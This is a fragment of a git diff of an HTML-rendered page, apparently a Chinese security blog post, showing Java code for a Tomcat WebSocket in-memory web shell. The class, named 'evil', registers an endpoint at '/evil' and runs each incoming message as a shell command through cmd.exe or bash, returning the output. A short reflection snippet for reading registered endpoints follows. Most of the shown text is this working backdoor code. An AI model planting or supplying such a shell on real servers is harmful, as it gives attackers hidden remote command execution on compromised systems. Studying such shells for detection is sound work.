+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;evil&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Endpoint&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MessageHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Whole&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;WebappClassLoaderBase&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;webappClassLoaderBase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;currentThread&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getContextClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;StandardContext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;standardContext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;StandardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;webappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getResources&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;build&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evil&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/evil&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;WsServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;attribute&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WsServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;standardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;attribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// System.out.println(&amp;#34;ok!&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DeploymentException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RuntimeException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onMessage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iswin&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getProperty&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;os.name&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toLowerCase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;startsWith&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;windows&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Process&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iswin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/c&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;});&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;});&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;InputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;StringBuilder&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StringBuilder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;waitFor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBasicRemote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;sendText&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nd&#34;&gt;@Override&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onOpen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addMessageHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;效果：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202207191826978.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
@@ -726,38 +846,38 @@ eventvwr.msc # 事件查看器（查看系统日志，安全日志）
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;synchronized&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getEndpointConfigs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;Field&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;configExactMatchMap&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;ConcurrentHashMap&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configExactMatchMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConcurrentHashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-
-    &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_ExactPathMatch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;org.apache.tomcat.websocket.server.WsServerContainer$ExactPathMatch&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
